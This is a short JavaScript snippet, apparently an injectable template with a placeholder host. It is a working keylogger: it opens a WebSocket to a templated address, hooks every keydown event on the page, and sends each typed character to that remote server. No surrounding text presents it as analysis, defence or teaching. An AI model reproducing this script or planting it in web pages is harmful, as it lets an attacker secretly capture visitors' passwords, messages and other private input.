(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeydown = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
